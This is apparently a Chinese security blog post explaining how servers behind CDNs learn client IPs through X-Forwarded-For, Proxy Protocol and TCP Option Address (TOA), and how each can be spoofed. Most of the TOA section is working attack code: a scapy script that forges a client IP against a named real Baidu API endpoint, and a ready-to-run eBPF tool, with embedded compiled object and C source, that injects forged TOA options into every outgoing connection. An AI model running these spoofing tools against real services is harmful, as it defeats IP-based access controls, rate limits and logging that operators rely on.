# 0x01 前言
在涉及负载均衡、CDN或代理服务的场景中，客户端请求需要经过多个中间设备才能到达目标服务器，这使得目标服务器难以直接获取客户端的原始IP地址。为了解决这个问题，目前通常采用以下三种方法来获取客户端的真实IP地址：
- 通过XFF（X-Forwarded-For）获取客户端IP
- 通过PP（Proxy Protocol）获取客户端IP
- 通过TOA（TCP Option Address）获取客户端IP

# 0x02 X-Forwarded-For
这个是最为认知的 IP 伪造方法，早年的 CTF 题目也经常涉及，然而现在知道的人太多， CTF 都不屑于出这类题目。 X-Forwarded-For 诞生的原因比较简单粗暴。 对于一个非常简单的网络模型， 一个网络请求通常只有两方，即请求方与被请求方，如下所示。这样的网络模型下， Web Server 是可以拿到 User 的真实 IP 地址的，即使拿到的可能是路由器的地址。
```
User --> Web Server
```
但是上了规模的网站，其网络模型不会这么简单，它可能长这样：
```
User --> CDN --> Web Server
```
在这种场景下， CDN 依旧可以拿到 User 的真实 IP 地址，然而 Web Server 却无法直接拿到。 为了解决这个问题， 有人提出了 X-Forwarded-For， 它作为 HTTP Header 传递给后端的 Web Server，其格式如下：
```
X-Forwarded-For: <client>, <proxy1>, <proxy2>
```
假设 User 的真实 IP 地址是 1.0.0.1， CDN 节点的 IP 地址是 2.0.0.2，那么 CDN 会在 HTTP 请求头里附加下面的 Header，通知 Web Server 用户的真实 IP 地址。 Web Server 根据这个 Header 解析出 User 的 IP。
```
X-Forwarded-For: 1.0.0.1, 2.0.0.2
```
细心的朋友可能会发现， 我是不是可以直接将 1.0.0.1 改成任意 IP 地址，然后直接将请求发送给 Web Server？没错，这就是非常简单的 X-Forwarded-For IP 伪造攻击。一般这类问题的解决思路是，校验 4 层协议的来源 IP，判断是否为可信 IP，比如是否为 CDN 的 IP。如果可信，才会尝试解析 X-Fowarded-For Header。

# Proxy Protocol
眼尖的朋友可能已经注意到了，X-Forwarded-For 只支持 HTTP 协议，那么 TCP 或者其它 4 层协议怎么办？这时候 Proxy Protocol 应运而生了。它最早于 2010 年被提出，并首先运用于 HAProxy 。 由于 Proxy Protocol 解决了实际应用中的痛点，越来越多的开源软件（如 NGINX）， CDN 厂商（如 Cloudflare 和 Cloudfront 等）已经支持 Proxy Protocol 了。 

目前 Proxy Protocol 共有两个版本，分别为 v1 和 v2。

Proxy Protocol v1 协议非常简单易懂。由于本文只是介绍，不会写过多的技术细节，力求用最简单的言语让读者知道它是怎么工作的。我们假定网络模型如下所示：
```
User --> Load Balancer --> TCP Server
```
V1 的原理说起来也非常简单， 当用户与 Load Balancer 的 4 层链接建立后（可能是 TCP ，也可能是 UDP）， Load Balancer 是知道用户的真实 IP 的。 Load Balancer 在和 TCP Server 建立 4 层链接后，不会直接透传用户的请求，而是提前发一个 Proxy Protocol V1 的 header。 这个 Header 具体长这样
```
PROXY TCP4 1.0.0.1 2.0.0.2 1001 2002\r\n
```
其中：

- PROXY 表示当前是一个4层代理请求

- TCP4 表示 User 使用 TCP v4 与 Load Balancer 建立的 4 层链路

- 1.0.0.1 为 User 的 IP， 2.0.0.2 为目标 IP

- 1001 为 User 的端口， 2002 为目标端口

当 V1 header 发送到 TCP Server 后， Load Balancer 才会开始透传 TCP 请求。而 TCP Server 需要做一些调整，解析完 Header 后，才开始进行业务逻辑。 幸运的是，目前许多 Server，包含 NGINX，已经支持了 V1 header 的解析，改改配置即可。

类似的， Proxy Protocol 也有 IP 伪造问题。攻击者是可以直接构造一个 V1 header， 直接发送给 TCP Server 的，造成 TCP 来源 IP 地址伪造问题。

Proxy Protocl V2 版本实际上是针对 V1 版本的升级优化。 V1 版本是一个纯文本协议，其最大的缺点是 Header 占用的字节太多了，比如上面的例子中就占用了 38 个字节。然而 Header 是给机器看的，又不是给人看的，可读性这么高有卵用？ 因此，V2 实际上是将 V1 升级成了一个二进制版本。它的构造相对来说没那么直观。以 IPv4 版本为例，其格式如下：
```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                                                               |
+                                                               +
|                  Proxy Protocol v2 Signature                  |
+                                                               +
|                                                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|Command|   AF  | Proto.|         Address Length        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                      IPv4 Source Address                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    IPv4 Destination Address                   |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |        Destination Port       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
V2 Header 在 IPv4 版本中， 只固定占用了 28 字节， 比 V1 版本少了约 10 字节（此处注意是“约”， v1 版本是变长的）。

Proxy Protocol V2 本质上只是变更了 Header 的编码方式，还是存在 IP 地址伪造问题。

# TOA (TCP Option Address)

相比前两种协议，TOA 的知名度并没有那么高。 TOA 的原理是利用 TCP 协议中的一个未使用字段。 讲述原理之前，先回顾一下 TCP Header 的格式：
```

    0                   1                   2                   3   
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |          Source Port          |       Destination Port        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                        Sequence Number                        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Acknowledgment Number                      |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |  Data |           |U|A|P|R|S|F|                               |
   | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
   |       |           |G|K|H|T|N|N|                               |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |           Checksum            |         Urgent Pointer        |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                    Options                    |    Padding    |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                             data                              |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```
可以看到， TCP Header 中是有一个叫 Options 的 Segment 的。 TOA 正是利用这个 Options 。Load Balancer 在接收到用户的请求后，会将用户的 IP 信息塞到 Options 里，其格式如下：
```C++
struct toa_data {
  __u8 opcode;
  __u8 opsize;
  __u16 port;
  __u32 ip;
};
```

TOA 最大的优势在于，其并没有变更协议，不会有兼容性问题。比如 TCP Server 如果不支持 TOA 协议，它依旧可以正常工作，只是获取不到真实的用户 IP 信息。

通过scapy库来实现，设置fake_ip，以及target_ip，target_port，这里我一开始是直接通过gethostbyname("qifu-api.baidubce.com")这样去获取的ip，发现有时候可行可不行，后来多地ping了下发现这个域名有7个cdn，经过测试只有112.34.112.38，182.61.62.106可行，应该是其他cdn不支持toa传递ip。

```python
from scapy.all import *
import socket
import struct
import os

# 目标域名和端口
target_ip = '112.34.112.38'
target_port = 80

# 伪造的源 IP 地址
fake_ip = '111.111.111.222'

# 将伪造的 IP 地址转换为整数
fake_ip_as_int = struct.unpack("!I", socket.inet_aton(fake_ip))[0]

# 创建自定义的 TCP 选项
option_254 = (254, b'\x00\x50' + struct.pack('!I', fake_ip_as_int))

# 创建 IP 层
ip_layer = IP(dst=target_ip)

# 创建 TCP 层，不添加 TCP 选项
syn = TCP(sport=RandShort(), dport=target_port, flags='S')

# 组合 IP 层和 TCP 层，发送 SYN 数据包
syn_ack = sr1(ip_layer/syn)

# 检查是否收到 SYN+ACK 数据包
if syn_ack[TCP].flags == 'SA':
    # 创建 ACK 数据包，也不添加 TCP 选项
    ack = TCP(sport=syn_ack[TCP].dport, dport=target_port, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
    
    # 发送 ACK 数据包
    send(ip_layer/ack)

    # 创建 HTTP 请求，只包含 Host 头部    
    http_request = 'GET /ip/local/geo/v1/district HTTP/1.1\r\n' \
                   'Host: qifu-api.baidubce.com\r\n\r\n'

    # 创建 HTTP 数据包，这次在 TCP 层添加自定义的选项
    http_packet = ip_layer / TCP(sport=syn_ack[TCP].dport, dport=target_port, flags='PA', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, options=[option_254]) / Raw(load=http_request)


    # 接收 HTTP 响应
    http_response = sr1(http_packet)

    # 打印 HTTP 响应
    if http_response:
        print(http_response.show())
    else:
        print('No response')
else:
    print('Did not receive SYN+ACK. Received: {}'.format(syn_ack[TCP].flags))
```

通过bpf来实现，近些年Linux完善了BPF的功能，使得我们不需要精通内核开发就可以修改TCP底层的结构，通过BPF提供的sockops接口，很方便的编写添加tcp options的代码，实现伪造TOA信息进而伪造IP。

```bash
# ubuntu 安装bpf
sudo apt install linux-tools-common
sudo apt-get install linux-tools-$(uname -r)

# 在 CentOS 7 或 8 上，你可以使用 yum 或 dnf 包管理器安装 bpftool 工具集：
sudo yum install -y bpftool
# 或
sudo dnf install -y bpftool

```

```python
import os
import re
import sys
import subprocess
import socket
import struct
import argparse

#Why is "set_toa_tcp_bs"? bs = beichen & skay
bpf_function_name = 'set_toa_tcp_bs'


bpf_content = b'\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\xf7\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd8\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x40\x00\x09\x00\x01\x00\xbf\x16\x00\x00\x00\x00\x00\x00\x18\x07\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x61\x61\x00\x00\x00\x00\x00\x00\xbf\x12\x00\x00\x00\x00\x00\x00\x07\x02\x00\x00\xfd\xff\xff\xff\xb7\x03\x00\x00\x02\x00\x00\x00\x2d\x23\x22\x00\x00\x00\x00\x00\x15\x01\x26\x00\x0e\x00\x00\x00\x15\x01\x01\x00\x0f\x00\x00\x00\x05\x00\x31\x00\x00\x00\x00\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x12\x00\x00\x00\x00\x00\x00\x71\x13\x06\x00\x00\x00\x00\x00\x67\x03\x00\x00\x08\x00\x00\x00\x71\x14\x05\x00\x00\x00\x00\x00\x4f\x43\x00\x00\x00\x00\x00\x00\x73\x2a\xf8\xff\x00\x00\x00\x00\xdc\x03\x00\x00\x10\x00\x00\x00\x6b\x3a\xfa\xff\x00\x00\x00\x00\x71\x12\x02\x00\x00\x00\x00\x00\x67\x02\x00\x00\x08\x00\x00\x00\x71\x13\x01\x00\x00\x00\x00\x00\x4f\x32\x00\x00\x00\x00\x00\x00\x71\x13\x03\x00\x00\x00\x00\x00\x67\x03\x00\x00\x10\x00\x00\x00\x71\x11\x04\x00\x00\x00\x00\x00\x67\x01\x00\x00\x18\x00\x00\x00\x4f\x31\x00\x00\x00\x00\x00\x00\x4f\x21\x00\x00\x00\x00\x00\x00\xdc\x01\x00\x00\x20\x00\x00\x00\x63\x1a\xfc\xff\x00\x00\x00\x00\xb7\x01\x00\x00\x08\x00\x00\x00\x73\x1a\xf9\xff\x00\x00\x00\x00\xbf\xa2\x00\x00\x00\x00\x00\x00\x07\x02\x00\x00\xf8\xff\xff\xff\xbf\x61\x00\x00\x00\x00\x00\x00\xb7\x03\x00\x00\x08\x00\x00\x00\xb7\x04\x00\x00\x00\x00\x00\x00\x85\x00\x00\x00\x8f\x00\x00\x00\x05\x00\x12\x00\x00\x00\x00\x00\x61\x62\x54\x00\x00\x00\x00\x00\x47\x02\x00\x00\x40\x00\x00\x00\xbf\x61\x00\x00\x00\x00\x00\x00\x85\x00\x00\x00\x3b\x00\x00\x00\x05\x00\x0d\x00\x00\x00\x00\x00\x61\x61\x08\x00\x00\x00\x00\x00\x07\x01\x00\x00\x08\x00\x00\x00\x67\x01\x00\x00\x20\x00\x00\x00\x77\x01\x00\x00\x20\x00\x00\x00\xb7\x07\x00\x00\x01\x00\x00\x00\xb7\x02\x00\x00\x29\x00\x00\x00\x2d\x12\x01\x00\x00\x00\x00\x00\xb7\x07\x00\x00\x00\x00\x00\x00\x67\x07\x00\x00\x03\x00\x00\x00\xbf\x61\x00\x00\x00\x00\x00\x00\xbf\x72\x00\x00\x00\x00\x00\x00\xb7\x03\x00\x00\x00\x00\x00\x00\x85\x00\x00\x00\x90\x00\x00\x00\x63\x76\x04\x00\x00\x00\x00\x00\xb7\x00\x00\x00\x01\x00\x00\x00\x95\x00\x00\x00\x00\x00\x00\x00\xfe\x08\x08\x08\x08\x22\x05\x47\x50\x4c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x45\x00\x00\x00\x04\x00\xf1\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x81\x00\x00\x00\x00\x00\x03\x00\x50\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7a\x00\x00\x00\x00\x00\x03\x00\x78\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x6c\x00\x00\x00\x00\x00\x03\x00\x58\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x65\x00\x00\x00\x00\x00\x03\x00\xe0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x73\x00\x00\x00\x00\x00\x03\x00\xb8\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x12\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf8\x01\x00\x00\x00\x00\x00\x00\x13\x00\x00\x00\x11\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x3c\x00\x00\x00\x11\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x58\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x07\x08\x09\x00\x2e\x74\x65\x78\x74\x00\x2e\x72\x65\x6c\x73\x6f\x63\x6b\x6f\x70\x73\x00\x74\x6f\x61\x5f\x6f\x70\x74\x69\x6f\x6e\x73\x00\x73\x65\x74\x5f\x74\x6f\x61\x5f\x74\x63\x70\x5f\x62\x73\x00\x2e\x6c\x6c\x76\x6d\x5f\x61\x64\x64\x72\x73\x69\x67\x00\x5f\x6c\x69\x63\x65\x6e\x73\x65\x00\x74\x63\x70\x2d\x72\x74\x6f\x2e\x63\x00\x2e\x73\x74\x72\x74\x61\x62\x00\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e\x64\x61\x74\x61\x00\x4c\x42\x42\x30\x5f\x38\x00\x4c\x42\x42\x30\x5f\x37\x00\x4c\x42\x42\x30\x5f\x36\x00\x4c\x42\x42\x30\x5f\x34\x00\x4c\x42\x42\x30\x5f\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4f\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4b\x03\x00\x00\x00\x00\x00\x00\x88\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\xf8\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x09\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x03\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x5f\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x38\x02\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3f\x02\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x00\x00\x00\x03\x4c\xff\x6f\x00\x00\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x03\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x57\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x48\x02\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00'


class UserOption:
    def __init__(self, toa_kind, toa_tcp_host, toa_tcp_port):
        self.toa_kind = toa_kind
        self.toa_tcp_host = toa_tcp_host
        self.toa_tcp_port = toa_tcp_port

        if type(self.toa_tcp_host) == str:
            packed_ip = socket.inet_aton(self.toa_tcp_host)
            self.toa_tcp_host = struct.unpack('!I', packed_ip)[0]

    def pack(self):
        return struct.pack('=B I H', self.toa_kind, self.toa_tcp_host, self.toa_tcp_port)

def get_current_cgroup():
    if os.path.exists('/sys/fs/cgroup/unified/'):
        return '/sys/fs/cgroup/unified/'

    with open('/proc/self/cgroup', 'r') as file:
        lines = file.readlines()

    cgroup_info = []
    for line in lines:
        cgroup_info = line.strip().split(':')

    return '/sys/fs/cgroup/' + cgroup_info[2][0:cgroup_info[2].index('/')]

def execute_command(cmd):
    return subprocess.check_output(cmd, shell=True, text=True)

def get_my_sock_ops_id():
    ret = execute_command('bpftool prog show')
    pattern = r'(\d+): sock_ops\s+name\s+set_toa_tcp_bs'
    matches = re.search(pattern, ret)
    if matches:
        return matches.group(1)   
    return -1

def detach_bpf(cgroup):
    prog_id = get_my_sock_ops_id()
    if prog_id == -1:
        print('bpf prog not load')
        return
    ret = os.system(f'bpftool cgroup detach {cgroup} sock_ops id {prog_id}')
    os.remove(f'/sys/fs/bpf/{bpf_function_name}')
    if ret == 0:
        print("[*] detach sucess")
    else:
        print("[!] detach fail")    

def attach_bpf(bpf_content_bytes,cgroup):
    bpf_file = open(f'{bpf_function_name}.o','wb')
    bpf_file.write(bpf_content_bytes)
    bpf_file.close()
    os.system(f'bpftool prog load {bpf_file.name} /sys/fs/bpf/{bpf_function_name}')
    prog_id = get_my_sock_ops_id()
    os.remove(bpf_file.name)
    if prog_id == -1:
        print('[!] load bpf fail')
        return
    ret = os.system(f'bpftool cgroup attach {cgroup} sock_ops id {prog_id}')

    if ret == 0:
        print('[*] attach success')
    else:
        print('[!] attach fail')


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Process arguments.')

    # 参数定义
    parser.add_argument('method', choices=['attach', 'detach'],
                        help='Method to use: attach or detach')
    parser.add_argument('--toa_ip', required=False, default='8.8.8.8',
                        help='TOA IP address  Fake Address')
    parser.add_argument('--toa_port', required=False, type=int, default=80,
                        help='TOA port Fake Port')
    parser.add_argument('--toa_kind', required=False, type=int, default=254,
                        help='TOA kind (0-255)')
    parser.add_argument('--cgroup', required=False, type=str, default=None,
                        help='cgroup')
    
    if len(sys.argv) == 1:
        print("""
Usage:
    python3 toa.py attach --toa_ip 8.8.8.8
    python3 toa.py attach --toa_ip 8.8.8.8  --toa_port 80
    python3 toa.py attach --toa_ip 8.8.8.8  --toa_port 80 --toa_kind 254
    python3 toa.py detach
""")

    args = parser.parse_args()

    cgroup = args.cgroup

    if cgroup is None:
        cgroup = get_current_cgroup()
    bpf_id = get_my_sock_ops_id()
    print(f'[*] cgroup: {cgroup}')
    
    if args.method == 'attach':

        if bpf_id != -1:
            detach_bpf(cgroup)

        defaultUserOption = UserOption(254,'8.8.8.8',1314)
        defaultUserOptionBytes = defaultUserOption.pack()
        bpfStructStartIndex = bpf_content.find(defaultUserOptionBytes)
        if bpfStructStartIndex == -1:
            print('[!] bad bpf')
            sys.exit(0)
        else:
          new_bpf_content = bytearray(bpf_content)
          userOption = UserOption(args.toa_kind,args.toa_ip,args.toa_port)
          userOptionBytes = userOption.pack()
          for i in range(len(userOptionBytes)):
              new_bpf_content[bpfStructStartIndex + i] = userOptionBytes[i]
          new_bpf_content = bytes(new_bpf_content)
          attach_bpf(new_bpf_content,cgroup)   

    elif args.method == 'detach':
        detach_bpf(cgroup)

```


```c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>


struct tcp_option_toa {
	__u8 kind;
	__u8 len;
	__u16 port;
    __u32 addr;
} __attribute__((packed));

struct user_option
{
    __u8 toa_kind;
    __u32 toa_tcp_host;
    __u16 toa_tcp_port;   
} __attribute__((packed));;


volatile struct user_option toa_options = {254,0x08080808,0x0522};


SEC("sockops")
int set_toa_tcp_bs(struct bpf_sock_ops *skops)
{
	int rv = -1;
	int op = (int) skops->op;
	switch (op) {
        case BPF_SOCK_OPS_TCP_CONNECT_CB: 
        case BPF_SOCK_OPS_ACTIVE_ESTABLISHED_CB: {
            bpf_sock_ops_cb_flags_set(skops, skops->bpf_sock_ops_cb_flags | BPF_SOCK_OPS_WRITE_HDR_OPT_CB_FLAG);
            break;
        }
        case BPF_SOCK_OPS_HDR_OPT_LEN_CB: {
            int option_len = sizeof(struct tcp_option_toa);
            if (skops->args[1] + option_len <= 40) {
                rv = option_len;
            }
            else {
                rv = 0;
            }
		    bpf_reserve_hdr_opt(skops, rv, 0);
            break;
        }

        case BPF_SOCK_OPS_WRITE_HDR_OPT_CB: {
            struct tcp_option_toa opt = {
                .kind = toa_options.toa_kind,
                .len  = 8,
                .port = bpf_htons(toa_options.toa_tcp_port),
                .addr = bpf_htonl(toa_options.toa_tcp_host),
            };

            int ret = bpf_store_hdr_opt(skops, &opt, sizeof(opt), 0);
            break;
        }
         
        default:
            rv = -1;
        }
	skops->reply = rv;
	return 1;
}

char _license[] SEC("license") = "GPL";
```

若你的产品是4层FNAT，RS使用TOA获取IP，都受到影响。包括不限于各家自定义toa结构体长度，即OPSIZE，自定义OPCODE kind ID等。从网上公开的信息来看，包括阿里云、阿里巴巴、腾讯云、华为云、字节等都有类似方案的痕迹。除了TOA，比如UDP的IP传递方式UOA，甚至基于IP Option的传递方式，也有类似的风险。

- https://github.com/aliyun/alibabacloud-cdn-tool-toa
- https://github.com/Huawei/TCP_option_address
- https://github.com/baidu/ttm